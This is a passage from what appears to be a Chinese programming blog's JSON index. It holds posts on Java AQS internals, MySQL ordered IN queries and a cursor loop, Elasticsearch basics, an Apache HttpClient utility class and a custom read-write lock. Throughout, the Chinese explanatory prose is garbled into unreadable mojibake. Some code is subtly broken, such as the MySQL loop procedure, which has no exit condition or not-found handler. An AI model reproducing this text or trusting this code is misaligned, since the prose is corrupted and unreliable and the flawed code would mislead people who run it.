successor. */ Node s = node.next; if (s == null || s.waitStatus &gt; 0) { s = null; for (Node t = tail; t != null &amp;&amp; t != node; t = t.prev) if (t.waitStatus &lt;= 0) s = t; } if (s != null) LockSupport.unpark(s.thread); }å½“å‰çº¿ç¨‹è·å–åŒæ­¥çŠ¶æ€å¹¶æ‰§è¡Œç›¸åº”é€»è¾‘ä¹‹å,å°±éœ€è¦é‡Šæ”¾åŒæ­¥æ–¹æ³•,ä½¿å¾—åç»­èŠ‚ç‚¹èƒ½å¤Ÿç»§ç»­è·å–åŒæ­¥çŠ¶æ€.é€šè¿‡è°ƒç”¨åŒæ­¥å™¨çš„ relase(int arg)æ–¹æ³•å¯ä»¥é‡Šæ”¾åŒæ­¥çŠ¶æ€,è¯¥æ–¹æ³•åœ¨é‡Šæ”¾äº†åŒæ­¥çŠ¶æ€ä¹‹å,ä¼šå”¤é†’å…¶åç»­èŠ‚ç‚¹. åˆ†æäº†ç‹¬å å¼åŒæ­¥çŠ¶æ€è·å–å’Œé‡Šæ”¾è¿‡ç¨‹åï¼Œé€‚å½“åšä¸ªæ€»ç»“ï¼šåœ¨è·å–åŒæ­¥çŠ¶æ€æ—¶ï¼ŒåŒæ­¥å™¨ç»´æŠ¤ä¸€ä¸ªåŒæ­¥é˜Ÿåˆ—ï¼Œè·å–çŠ¶æ€å¤±è´¥çš„çº¿ç¨‹éƒ½ä¼šè¢«åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­å¹¶åœ¨é˜Ÿåˆ—ä¸­è¿›è¡Œè‡ªæ—‹ï¼›ç§»å‡ºé˜Ÿåˆ—ï¼ˆæˆ–åœæ­¢è‡ªæ—‹ï¼‰çš„æ¡ä»¶æ˜¯å‰é©±èŠ‚ç‚¹ä¸ºå¤´èŠ‚ç‚¹ä¸”æˆåŠŸè·å–äº†åŒæ­¥çŠ¶æ€ã€‚åœ¨é‡Šæ”¾åŒæ­¥çŠ¶æ€æ—¶ï¼ŒåŒæ­¥å™¨è°ƒç”¨tryRelease(int arg) æ–¹æ³•é‡Šæ”¾åŒæ­¥çŠ¶æ€ï¼Œç„¶åå”¤é†’å¤´èŠ‚ç‚¹çš„åç»§èŠ‚ç‚¹ã€‚ å…±äº«å¼è·å–åŒæ­¥çŠ¶æ€public final void acquireShared(int arg) { if (tryAcquireShared(arg) &lt; 0) doAcquireShared(arg); } private void doAcquireShared(int arg) { final Node node = addWaiter(Node.SHARED); boolean failed = true; try { boolean interrupted = false; for (;;) { final Node p = node.predecessor(); if (p == head) { int r = tryAcquireShared(arg); if (r &gt;= 0) { setHeadAndPropagate(node, r); p.next = null; // help GC if (interrupted) selfInterrupt(); failed = false; return; } } if (shouldParkAfterFailedAcquire(p, node) &amp;&amp; parkAndCheckInterrupt()) interrupted = true; } } finally { if (failed) cancelAcquire(node); } }åœ¨ acquireShared(int arg) æ–¹æ³•ä¸­ï¼ŒåŒæ­¥å™¨è°ƒç”¨tryAcquireShared(int arg)æ–¹æ³•å°è¯•è·å–åŒæ­¥çŠ¶æ€ï¼Œ tryAcquireShared(int arg)è¿”å›å€¼æ˜¯intç±»å‹ï¼Œä½†è¿”å›å€¼å¤§äº0å°±ä»£è¡¨å¯ä»¥è·å–åŒæ­¥çŠ¶æ€ã€‚å› æ­¤åœ¨å…±äº«å¼è·å–çš„è‡ªæ—‹è¿‡ç¨‹ä¸­ï¼ŒæˆåŠŸè·å–åˆ°åŒæ­¥çŠ¶æ€å¹¶é€€å‡ºè‡ªæ—‹çš„æ¡ä»¶å°±æ˜¯tryAcquireShared(intarg)å¤§äºç­‰äº0 é‡Šæ”¾åŒæ­¥çŠ¶æ€public final boolean releaseShared(int arg) { if (tryReleaseShared(arg)) { doReleaseShared(); return true; } return false; }é‡Šæ”¾åŒæ­¥çŠ¶æ€ä¸€èˆ¬æ˜¯é€šè¿‡å¾ªç¯å’Œcasæ¥ä¿è¯ï¼Œå› ä¸ºé‡Šæ”¾åŒæ­¥çŠ¶æ€çš„æ“ä½œä¼šåŒæ—¶æ¥è‡ªå¤šä¸ªçº¿ç¨‹ã€‚","categories":[],"tags":[{"name":"Javaå¹¶å‘","slug":"Javaå¹¶å‘","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"aqs","slug":"aqs","permalink":"http://yoursite.com/tags/aqs/"}]},{"title":"mysql inæœ‰åºæŸ¥è¯¢","slug":"mysql inæœ‰åºæŸ¥è¯¢","date":"2019-09-19T09:28:15.000Z","updated":"2020-11-14T17:10:54.140Z","comments":true,"path":"2019/09/19/mysql inæœ‰åºæŸ¥è¯¢/","link":"","permalink":"http://yoursite.com/2019/09/19/mysql%20in%E6%9C%89%E5%BA%8F%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"select * from hair_system_hairstyle where id in (24,23,25) å¦‚æœæƒ³è¦æŸ¥è¯¢æ ¹æ®,24,23,25é¡ºåºselect * from hair_system_hairstyle where id in (24,23,25) order by field(id,24,23,25)æ•ˆæœ","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"elasticsearchåŸºç¡€ç¯‡","slug":"elasticsearchåŸºç¡€ç¯‡","date":"2019-09-18T15:29:27.000Z","updated":"2020-11-14T17:10:55.291Z","comments":true,"path":"2019/09/18/elasticsearchåŸºç¡€ç¯‡/","link":"","permalink":"http://yoursite.com/2019/09/18/elasticsearch%E5%9F%BA%E7%A1%80%E7%AF%87/","excerpt":"","text":"å®‰è£…å®‰è£…elasticSearchå’Œkibana ç®€å•åº”ç”¨ä¸€ä¸ªElasticsearché›†ç¾¤å¯ä»¥åŒ…å«å¤šä¸ªç´¢å¼•(index),ç›¸åº”çš„æ¯ä¸ªç´¢å¼•å¯ä»¥åŒ…å«å¤šä¸ªç±»å‹(type).è¿™äº›ä¸åŒçš„ç±»å‹å­˜å‚¨ç€å¤šä¸ªæ–‡æ¡£,æ¯ä¸ªæ–‡æ¡£åˆæœ‰å¤šä¸ªå±æ€§ æ”¾å…¥ä¿¡æ¯PUT /megacorp/employee/1 { &quot;first_name&quot; : &quot;John&quot;, &quot;last_name&quot; : &quot;Smith&quot;, &quot;age&quot; : 25, &quot;about&quot; : &quot;I love to go rock climbing&quot;, &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ] } PUT /megacorp/employee/2 { &quot;first_name&quot; : &quot;Jane&quot;, &quot;last_name&quot; : &quot;Smith&quot;, &quot;age&quot; : 32, &quot;about&quot; : &quot;I like to collect rock albums&quot;, &quot;interests&quot;: [ &quot;music&quot; ] } PUT /megacorp/employee/3 { &quot;first_name&quot; : &quot;Douglas&quot;, &quot;last_name&quot; : &quot;Fir&quot;, &quot;age&quot; : 35, &quot;about&quot;: &quot;I like to build cabinets&quot;, &quot;interests&quot;: [ &quot;forestry&quot; ] }å…¶ä¸­ megacorp ç´¢å¼•åç§°, employee ç±»å‹åç§°, 1 æ˜¯ç‰¹å®šé›‡å‘˜çš„ID æ£€ç´¢å•ä¸ªé›‡å‘˜GET /megacorp/employee/1 è¿”å›å€¼, { &quot;_index&quot;: &quot;megacorp&quot;, &quot;_type&quot;: &quot;employee&quot;, &quot;_id&quot;: &quot;1&quot;, &quot;_version&quot;: 1, &quot;found&quot;: true, &quot;_source&quot;: { &quot;first_name&quot;: &quot;John&quot;, &quot;last_name&quot;: &quot;Smith&quot;, &quot;age&quot;: 25, &quot;about&quot;: &quot;I love to go rock climbing&quot;, &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ] } }è½»é‡æœç´ è·å–æ‰€æœ‰é›‡å‘˜ GET /megacorp/employee/_searchæŸ¥è¯¢å­—ç¬¦ä¸² GET /megacorp/employee/_search?q=last_name:smith ç»“æœ { &quot;took&quot;: 110, &quot;timed_out&quot;: false, &quot;_shards&quot;: { &quot;total&quot;: 5, &quot;successful&quot;: 5, &quot;skipped&quot;: 0, &quot;failed&quot;: 0 }, &quot;hits&quot;: { &quot;total&quot;: 2, &quot;max_score&quot;: 0.2876821, &quot;hits&quot;: [ { &quot;_index&quot;: &quot;megacorp&quot;, &quot;_type&quot;: &quot;employee&quot;, &quot;_id&quot;: &quot;2&quot;, &quot;_score&quot;: 0.2876821, &quot;_source&quot;: { &quot;first_name&quot;: &quot;Jane&quot;, &quot;last_name&quot;: &quot;Smith&quot;, &quot;age&quot;: 32, &quot;about&quot;: &quot;I like to collect rock albums&quot;, &quot;interests&quot;: [ &quot;music&quot; ] } }, { &quot;_index&quot;: &quot;megacorp&quot;, &quot;_type&quot;: &quot;employee&quot;, &quot;_id&quot;: &quot;1&quot;, &quot;_score&quot;: 0.2876821, &quot;_source&quot;: { &quot;first_name&quot;: &quot;John&quot;, &quot;last_name&quot;: &quot;Smith&quot;, &quot;age&quot;: 25, &quot;about&quot;: &quot;I love to go rock climbing&quot;, &quot;interests&quot;: [ &quot;sports&quot;, &quot;music&quot; ] } } ] } }æŸ¥è¯¢çš„æ—¶å€™,ä¼šå‘ç°,çœŸå®æ•°æ®ä¸­last_nameæ˜¯Simth,éƒ½æŸ¥è¯¢å‡ºæ¥äº†,ä½†æ˜¯æœ‰ _scoreè¿™ä¸ªæ ‡ç­¾,_scoreæ˜¯ä¸€ç§ç¡®å®šåŒ¹é…ä¸æŸ¥è¯¢çš„ç›¸å…³ç¨‹åº¦çš„æ–¹æ³•. ä½¿ç”¨æŸ¥è¯¢è¡¨è¾¾å¼æœç´ GET /megacorp/employee/_search { &quot;query&quot;: { &quot;match&quot;: { &quot;last_name&quot;: &quot;smith&quot; } } }å¯ä»¥å‘ç°,å’Œä¸Šé¢çš„æŸ¥è¯¢æ˜¯ä¸€æ ·çš„ å¤æ‚çš„æœç´¢GET /megacorp/employee/_search { &quot;query&quot; : { &quot;bool&quot;: { &quot;must&quot;: { &quot;match&quot; : { &quot;last_name&quot; : &quot;smith&quot; } }, &quot;filter&quot;: { &quot;range&quot; : { &quot;age&quot; : { &quot;gt&quot; : 30 } } } } } }æœç´¢æœ€åä¸€ä¸ªåå­—æ˜¯smithçš„,å¹¶è¿‡æ»¤å…¶ä¸­å¹´é¾„å¤§äº30å²çš„ å…¨æ–‡æœç´¢GET /megacorp/employee/_search { &quot;query&quot;:{ &quot;match&quot;:{ &quot;about&quot;: &quot;rock climbing&quot; } } }å¯ä»¥æ‰¾åˆ°ä¸¤æ¡,å…¶ä¸­ä¸€æ¡æ•°æ®æ˜¯ &quot;about&quot;: &quot;I love to go rock climbing&quot; è¿˜æœ‰ä¸€æ¡æ˜¯ &quot;about&quot;: &quot;I like to collect rock albums&quot; ä¸ºä»€ä¹ˆç¬¬äºŒæ¡ä¹Ÿæœ‰å‘¢,å› ä¸ºæåˆ°äº†rock,åªæ˜¯_scoreç›¸åº”çš„ä½äº†ä¸€ç‚¹ çŸ­è¯­æŸ¥æ‰¾GET /megacorp/employee/_search { &quot;query&quot;:{ &quot;match_phrase&quot;: { &quot;about&quot;: &quot;rock climbing&quot; } } }å¯ä»¥ç²¾ç¡®æŸ¥æ‰¾","categories":[],"tags":[{"name":"elasticsearch","slug":"elasticsearch","permalink":"http://yoursite.com/tags/elasticsearch/"}]},{"title":"mysql loop","slug":"mysql loop","date":"2019-09-17T03:19:27.000Z","updated":"2020-11-14T17:10:56.179Z","comments":true,"path":"2019/09/17/mysql loop/","link":"","permalink":"http://yoursite.com/2019/09/17/mysql%20loop/","excerpt":"","text":"mysqlä¸­å¾ªç¯,æŸ¥æ‰¾å¹¶æ’å…¥æ•°æ®DELIMITER // DROP PROCEDURE IF EXISTS doWhile; CREATE PROCEDURE doWhile() BEGIN DECLARE hair_id VARCHAR(300); DECLARE sortx INT DEFAULT 0; DECLARE review_id INT; DECLARE cursor1 CURSOR FOR (SELECT system_hairstyle_id,sortx FROM hair_system WHERE status = 1); set review_id = 99; OPEN cursor1; read_loop: LOOP FETCH FROM cursor1 INTO hair_id,sortx; INSERT INTO hair_store (review_id,system_hairstyle_id,sort,status) VALUE (review_id, hair_id,sortx,1); END LOOP; CLOSE cursor1; END; // CALL doWhile(); è¿™å¥è¯­å¥æ˜¯æ˜¯å®šä¹‰äº†éƒ¨åˆ†å˜é‡,å¹¶ä»cursorä¸­è¯»å–ä¿¡æ¯,å¹¶å°†ç›¸åº”ä¿¡æ¯æ”¾å…¥åˆ°æ–°è¡¨ä¸­ [ æ¥æº ](https://pritomkumar.blogspot.com/2017/06/mysql-insert-with-while-loop-use-loop.html)","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"},{"name":"mysql loop","slug":"mysql-loop","permalink":"http://yoursite.com/tags/mysql-loop/"}]},{"title":"httpClientå·¥å…·ç±»","slug":"httpClientå·¥å…·ç±»","date":"2019-09-05T07:59:31.000Z","updated":"2020-11-14T17:10:56.748Z","comments":true,"path":"2019/09/05/httpClientå·¥å…·ç±»/","link":"","permalink":"http://yoursite.com/2019/09/05/httpClient%E5%B7%A5%E5%85%B7%E7%B1%BB/","excerpt":"","text":"httpClientå·¥å…·ç±»pomé…ç½®&lt;!-- apache httpclientç»„ä»¶ start--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt; &lt;artifactId&gt;httpclient&lt;/artifactId&gt; &lt;version&gt;4.5.5&lt;/version&gt; &lt;/dependency&gt; &lt;!-- apache httpclientç»„ä»¶ end--&gt; &lt;!-- fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.58&lt;/version&gt; &lt;/dependency&gt; &lt;!-- fastjson END --&gt;å·¥å…·åŒ…import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.JSONObject; import org.apache.http.NameValuePair; import org.apache.http.client.config.RequestConfig; import org.apache.http.client.entity.UrlEncodedFormEntity; import org.apache.http.client.methods.*; import org.apache.http.client.utils.URIBuilder; import org.apache.http.entity.StringEntity; import org.apache.http.impl.client.CloseableHttpClient; import org.apache.http.impl.client.HttpClients; import org.apache.http.message.BasicNameValuePair; import org.apache.http.util.EntityUtils; import java.io.IOException; import java.io.UnsupportedEncodingException; import java.net.URI; import java.util.ArrayList; import java.util.List; import java.util.Map; import java.util.Set; /** * Description:httpclientå·¥å…·ç±» * @author husky * @date 2019/9/5 11:35 */ public class HttpClientUtil { /** * ENCODING ç¼–ç æ ¼å¼ã€‚å‘é€ç¼–ç æ ¼å¼ç»Ÿä¸€ç”¨UTF-8 * */ private static final String ENCODING = &quot;UTF-8&quot;; /** * CONNECT_TIMEOUT è®¾ç½®è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ¯«ç§’ã€‚ * */ private static final int CONNECT_TIMEOUT = 6000; /** * SOCKET_TIMEOUT è¯·æ±‚è·å–æ•°æ®çš„è¶…æ—¶æ—¶é—´(å³å“åº”æ—¶é—´)ï¼Œå•ä½æ¯«ç§’ã€‚ */ private static final int SOCKET_TIMEOUT = 6000; /** * å‘é€getè¯·æ±‚:å¸¦è¯·æ±‚å¤´å’Œè¯·æ±‚å‚æ•° * @param url è¯·æ±‚åœ°å€ * @param headers è¯·æ±‚å¤´ * @param params è¯·æ±‚å‚æ•°é›†åˆ * @return JSONObject * @throws Exception */ public static JSONObject doGet(String url, Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception { //åˆ›å»ºhttpClientå¯¹è±¡ CloseableHttpClient httpClient = HttpClients.createDefault(); URIBuilder uriBuilder = new URIBuilder(url); if (params != null) { Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet(); for (Map.Entry&lt;String, String&gt; entry : entrySet) { uriBuilder.setParameter(entry.getKey(), entry.getValue()); } } URI uri = uriBuilder.build(); HttpGet httpGet = new HttpGet(uri); //è®¾ç½®å‚æ•° httpGet.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build()); //è®¾ç½®è¯·æ±‚å¤´ packageHeader(headers,httpGet); CloseableHttpResponse httpResponse = null; try { return getResponse(httpResponse,httpClient,httpGet); }finally { release(httpResponse,httpClient); } } /** * description è¡¨å•æ–¹å¼çš„post * @param url è¯·æ±‚åœ°å€ * @param headers è¯·æ±‚å¤´ * @param params è¯·æ±‚å‚æ•° * @return JSONObject * @throws Exception */ public static JSONObject doFormPost(String url,Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception{ // åˆ›å»ºhttpClientå¯¹è±¡ CloseableHttpClient httpClient = HttpClients.createDefault(); // åˆ›å»ºhttpå¯¹è±¡ HttpPost httpPost = new HttpPost(url); httpPost.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build()); //å°è£…è¯·æ±‚å‚æ•° packageHeader(headers,httpPost); //å°è£…è¯·æ±‚å¤´ packageFormParam(params,httpPost); CloseableHttpResponse httpResponse = null; try{ return getResponse(httpResponse,httpClient,httpPost); }finally { release(httpResponse,httpClient); } } /** * description è¡¨å•æ–¹å¼çš„post * @param url è¯·æ±‚å¤´ * @param headers è¯·æ±‚å¤´ * @param params è¯·æ±‚å‚æ•° * @return JSONObject * @throws Exception */ public static JSONObject doJsonPost(String url,Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params) throws Exception{ // åˆ›å»ºhttpClientå¯¹è±¡ CloseableHttpClient httpClient = HttpClients.createDefault(); // åˆ›å»ºhttpå¯¹è±¡ HttpPost httpPost = new HttpPost(url); httpPost.setConfig(RequestConfig.custom().setConnectTimeout(CONNECT_TIMEOUT).setSocketTimeout(SOCKET_TIMEOUT).build()); //å°è£…è¯·æ±‚å‚æ•° packageHeader(headers,httpPost); //å°è£…è¯·æ±‚å¤´ packageJsonParam(params,httpPost); CloseableHttpResponse httpResponse = null; try{ return getResponse(httpResponse,httpClient,httpPost); }finally { release(httpResponse,httpClient); } } /** * Description: å°è£…è¯·æ±‚å¤´ * @param params * @param httpMethod */ public static void packageHeader(Map&lt;String, String&gt; params, HttpRequestBase httpMethod) { // å°è£…è¯·æ±‚å¤´ if (params != null) { Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet(); for (Map.Entry&lt;String, String&gt; entry : entrySet) { // è®¾ç½®åˆ°è¯·æ±‚å¤´åˆ°HttpRequestBaseå¯¹è±¡ä¸­ httpMethod.setHeader(entry.getKey(), entry.getValue()); } } } /** * Description: å°è£…è¡¨å•è¯·æ±‚å‚æ•° * * @param params * @param httpMethod * @throws UnsupportedEncodingException */ public static void packageFormParam(Map&lt;String, String&gt; params, HttpEntityEnclosingRequestBase httpMethod) throws UnsupportedEncodingException { // å°è£…è¯·æ±‚å‚æ•° if (params != null) { List&lt;NameValuePair&gt; nvps = new ArrayList&lt;NameValuePair&gt;(); Set&lt;Map.Entry&lt;String, String&gt;&gt; entrySet = params.entrySet(); for (Map.Entry&lt;String, String&gt; entry : entrySet) { nvps.add(new BasicNameValuePair(entry.getKey(), entry.getValue())); } // è®¾ç½®åˆ°è¯·æ±‚çš„httpå¯¹è±¡ä¸­ httpMethod.setEntity(new UrlEncodedFormEntity(nvps, ENCODING)); } } /** * Description: å°è£…jsonè¯·æ±‚å‚æ•° * * @param params * @param httpMethod * @throws UnsupportedEncodingException */ public static void packageJsonParam(Map&lt;String, String&gt; params, HttpEntityEnclosingRequestBase httpMethod) throws UnsupportedEncodingException { // å°è£…è¯·æ±‚å‚æ•° if (params != null) { JSONObject jsonParam = new JSONObject(); Set&lt;Map.Entry&lt;String,String&gt;&gt; entrySet = params.entrySet(); for(Map.Entry&lt;String,String&gt; entry : entrySet){ jsonParam.put(entry.getKey(),entry.getValue()); } StringEntity entity = new StringEntity(jsonParam.toString(),ENCODING); entity.setContentEncoding(ENCODING); entity.setContentType(&quot;application/json&quot;); // è®¾ç½®åˆ°è¯·æ±‚çš„httpå¯¹è±¡ä¸­ httpMethod.setEntity(entity); } } /** * Description: é‡Šæ”¾èµ„æº * * @param httpResponse * @param httpClient * @throws IOException */ public static void release(CloseableHttpResponse httpResponse, CloseableHttpClient httpClient) throws IOException { // é‡Šæ”¾èµ„æº if (httpResponse != null) { httpResponse.close(); } if (httpClient != null) { httpClient.close(); } } /** * Description: è·å¾—å“åº”ç»“æœ * * @param httpResponse * @param httpClient * @param httpMethod * @return * @throws Exception */ public static JSONObject getResponse(CloseableHttpResponse httpResponse, CloseableHttpClient httpClient, HttpRequestBase httpMethod) throws Exception { // æ‰§è¡Œè¯·æ±‚ httpResponse = httpClient.execute(httpMethod); // è·å–è¿”å›ç»“æœ if (httpResponse != null &amp;&amp; httpResponse.getStatusLine() != null) { StringBuffer content = new StringBuffer(); if (httpResponse.getEntity() != null) { content.append(EntityUtils.toString(httpResponse.getEntity(), ENCODING)); } return JSON.parseObject(content.toString()); } JSONObject data = new JSONObject(); data.put(&quot;code&quot;,&quot;999&quot;); data.put(&quot;content&quot;,&quot;ç½‘ç»œå¼‚å¸¸&quot;); return data; } }å·¥å…·åŒ…åŠŸèƒ½+ æä¾›get,postè¡¨å•è¯·æ±‚,postJsonè¯·æ±‚ + è¿˜æœ‰å…¶ä»–åŠŸèƒ½,æ¬¢è¿æ¥pr,[é¡¹ç›®åœ°å€](https://github.com/huskyui/httpclientutil)å†™å·¥å…·åŒ…çš„åŸå› å› ä¸ºè¦ç”¨åˆ°å¾®ä¿¡çš„æ¥å£,åªèƒ½è‡ªå·±å‡†å¤‡ä¸€ä¸ª.","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"httpClientå·¥å…·ç±»","slug":"httpClientå·¥å…·ç±»","permalink":"http://yoursite.com/tags/httpClient%E5%B7%A5%E5%85%B7%E7%B1%BB/"}]},{"title":"è¯»å†™é”","slug":"è¯»å†™é”","date":"2019-09-02T06:29:08.000Z","updated":"2020-11-14T17:10:57.343Z","comments":true,"path":"2019/09/02/è¯»å†™é”/","link":"","permalink":"http://yoursite.com/2019/09/02/%E8%AF%BB%E5%86%99%E9%94%81/","excerpt":"","text":"readWriteLock è¯»å†™é”ä¹Ÿå°±æ˜¯å…±äº«-ç‹¬å é”,è¯»é”ä¹‹é—´å¯ä»¥å…±äº«é”,ä½†æ˜¯è¯»é”å’Œå†™é”ä¹‹é—´ä¸å¯ä»¥å…±äº«,å†™é”ä¹‹é—´ä¹Ÿä¸å¯å…±äº«. å­¦ä¹ çš„è¿™ä¸ªè¯»å†™é”çš„è®¾è®¡,å®ƒçš„æ ¸å¿ƒæ˜¯ 1.å¤šä¸ªçº¿ç¨‹(è¯»é”,å†™é”)éƒ½æ˜¯ç”¨åŒä¸€ä¸ªå¯¹è±¡é”,ç„¶åç”¨sychronizedæ¥å”¤é†’å…¨éƒ¨ä»¥åŠæ²‰ç¡. 2.å®šä¹‰äº†è¯»é”æ•°é‡å˜é‡,å½“å‰å†™é”æ•°é‡,å½“å‰ç­‰å¾…å†™é”æ•°é‡æ¥æ˜¯å¦éœ€è¦ç¡çœ å’Œå”¤é†’ lockæ¥å£/** * è¯»å†™é”çš„å†…æ¶µå°±æ˜¯å…±äº«-ç‹¬å é” * @author husky * @date 2019/8/27 9:44 */ public interface Lock { /**è·å–æ˜¾ç¤ºé”,æ²¡æœ‰è·å¾—é”çš„çº¿ç¨‹å°†è¢«é˜»å¡*/ void lock() throws InterruptedException; /**é‡Šæ”¾é”*/ void unlock(); }ReadWriteLockæ¥å£/** * @author husky * @date 2019/8/27 9:50 */ public interface ReadWriteLock { /**åˆ›å»ºreaderé”*/ Lock readLock(); /**åˆ›å»ºwriteé”*/ Lock writeLock(); /**è·å–å½“å‰æœ‰å¤šå°‘çº¿ç¨‹æ­£åœ¨æ‰§è¡Œå†™æ“ä½œ*/ int getWritingWriters(); /**è·å–å½“å‰æœ‰å¤šå°‘çº¿ç¨‹æ­£åœ¨ç­‰å¾…è·å–å†™å…¥é”*/ int getWaitingWriters(); /**è·å–å½“å‰æœ‰å¤šå°‘çº¿ç¨‹æ­£åœ¨æ‰§è¡Œreaderé”*/ int getReadingReaders(); /**å·¥å‚æ–¹æ³•,åˆ›å»ºReadWriteLock*/ static ReadWriteLock readWriteLock(){ return new ReadWriteLockImpl(); } /**å·¥å‚æ–¹æ³•,åˆ›å»ºReadWriteLock,å¹¶ä¸”ä¼ å…¥preferWriter*/ static ReadWriteLock readWriteLock(boolean preferWriter){ return new ReadWriteLockImpl(preferWriter); } }readwriteLockå®ç°ç±»/** * åŒ…å¯è§,åˆ›å»ºæ—¶ä½¿ç”¨ReadWriteLockçš„createæ–¹æ³• * @author husky * @date 2019/8/27 10:59 */ public class ReadWriteLockImpl implements ReadWriteLock { /**å®šä¹‰å¯¹è±¡é”*/ private final Object MUTEX = new Object(); /**å½“å‰æœ‰å¤šå°‘çº¿ç¨‹æ­£åœ¨å†™å…¥*/ private int writingWriters = 0; /**å½“å‰æœ‰å¤šå°‘çº¿ç¨‹æ­£åœ¨ç­‰å¾…å†™å…¥*/ private int waitingWriters = 0; /**å½“å‰æœ‰å¤šå°‘çº¿ç¨‹æ­£åœ¨read*/ private int readingReaders = 0; /**readå’Œwriteçš„åå¥½è®¾ç½®*/ private boolean preferWriter; public ReadWriteLockImpl(){ this(true); } public ReadWriteLockImpl(boolean preferWriter){ this.preferWriter = preferWriter; } @Override public Lock readLock() { return new ReadLock(this); } @Override public Lock writeLock() { return new WriteLock(this); } /**ä½¿å†™çº¿ç¨‹çš„æ•°é‡å¢åŠ */ void incrementWritingWriters(){ this.writingWriters++; } /**ä½¿ç­‰å¾…å†™å…¥çš„çº¿ç¨‹æ•°é‡å¢åŠ */ void incrementWaitingWriters(){ this.waitingWriters++; } /**ä½¿è¯»çº¿ç¨‹çš„æ•°é‡å¢åŠ */ void incrementReadingReaders(){ this.readingReaders++; } /**ä½¿å†™çº¿ç¨‹çš„æ•°é‡å‡å°‘*/ void decrementWritingWriters(){ this.writingWriters--; } /**ä½¿ç­‰å¾…è·å–å†™å…¥é”çš„æ•°é‡å‡ä¸€*/ void decrementWaitingWriters(){ this.waitingWriters--; } /**ä½¿è¯»å–çº¿ç¨‹çš„æ•°é‡å‡ä¸€*/ void decrementReadingReaders(){ this.readingReaders--; } @Override public int getWritingWriters() { return this.writingWriters; } @Override public int getWaitingWriters() { return this.waitingWriters; } @Override public int getReadingReaders() { return this.readingReaders; } /**è·å–å¯¹è±¡é”*/ Object getMutex(){ return this.MUTEX; } /**è·å–å½“å‰æ˜¯å¦åå‘å†™é”*/ boolean getPreferWriter(){ return this.preferWriter; } /**è®¾ç½®å†™é”åå¥½*/ void changePrefer(boolean preferWriter){ this.preferWriter = preferWriter; } }readLock/** * @author husky * @date 2019/8/29 16:38 */ class ReadLock implements Lock{ private final ReadWriteLockImpl readWriteLock; ReadLock(ReadWriteLockImpl readWriteLock){ this.readWriteLock = readWriteLock; } @Override public void lock() throws InterruptedException { //ä½¿ç”¨mutexä½œä¸ºé” synchronized (readWriteLock.getMutex()){ //è‹¥æ­¤æ—¶æœ‰çº¿ç¨‹åœ¨è¿›è¡Œå†™æ“ä½œ,æˆ–è€…åå‘å†™é”çš„æ ‡å¿—ä¸ºtrueæ—¶é‚£ä¹ˆç­‰å¾…å†™é”æ•°é‡&gt;0æ—¶,å°±ä¼šæ— æ³•è·å¾—è¯»é” while(readWriteLock.getWritingWriters()&gt;0||(readWriteLock.getPreferWriter()&amp;&amp;readWriteLock.getWaitingWriters()&gt;0)){ readWriteLock.getMutex().wait(); } readWriteLock.incrementReadingReaders(); } } @Override public void unlock() { //ä½¿ç”¨Mutexä½œä¸ºé”,å¹¶ä¸”è¿›è¡ŒåŒæ­¥ synchronized (readWriteLock.getMutex()){ //é‡Šæ”¾é”ä½¿å½“å‰readingçš„æ•°é‡å‡ä¸€ //å°†perferWriterè®¾ç½®ä¸ºtrue,å¯ä»¥ä½¿å¾—writerçº¿ç¨‹è·å¾—æ›´å¤šæœºä¼š //é€šçŸ¥å”¤é†’ä¸Mutexå…³è”monitor waitsetä¸­çš„çº¿ç¨‹ readWriteLock.decrementReadingReaders(); readWriteLock.changePrefer(true); readWriteLock.getMutex().notifyAll(); } } }writeLock** * @author husky * @date 2019/8/29 16:55 */ class WriteLock implements Lock{ private final ReadWriteLockImpl readWriteLock; WriteLock(ReadWriteLockImpl readWriteLock){ this.readWriteLock = readWriteLock; } @Override public void lock() throws InterruptedException { synchronized (readWriteLock.getMutex()){ try{ //é¦–å…ˆä½¿ç­‰å¾…è·å–å†™å…¥é”çš„æ•°å­—åŠ ä¸€ readWriteLock.incrementWaitingWriters(); //å¦‚æœæœ‰çº¿ç¨‹åœ¨è¯»å–æ•°æ®æˆ–è€…å†™æ•°æ® while(readWriteLock.getWritingWriters()&gt;0||readWriteLock.getReadingReaders()&gt;0){ readWriteLock.getMutex().wait(); } }finally { //æœ€ç»ˆå‡å°‘ç­‰å¾…å†™çº¿ç¨‹çš„æ•°é‡ readWriteLock.decrementWaitingWriters(); } //è·å–åˆ°é”å,å¢åŠ æ­£åœ¨å†™é”çš„æ•°é‡ readWriteLock.incrementWritingWriters(); } } @Override public void unlock() { synchronized (readWriteLock.getMutex()){ //å‡å°‘æ­£åœ¨å†™å…¥é”çš„çº¿ç¨‹è®¡æ•°å™¨ readWriteLock.decrementWritingWriters(); //å°†åå¥½è®¾ç½®æˆfalse,å¯ä»¥ä½¿å¾—è¯»é”è¢«æ›´å¿«é€Ÿçš„è·å¾— readWriteLock.changePrefer(false); //é€šçŸ¥å”¤é†’å…¶ä»–åœ¨Mutext monitor wautsetä¸­å…¶ä»–çº¿ç¨‹ 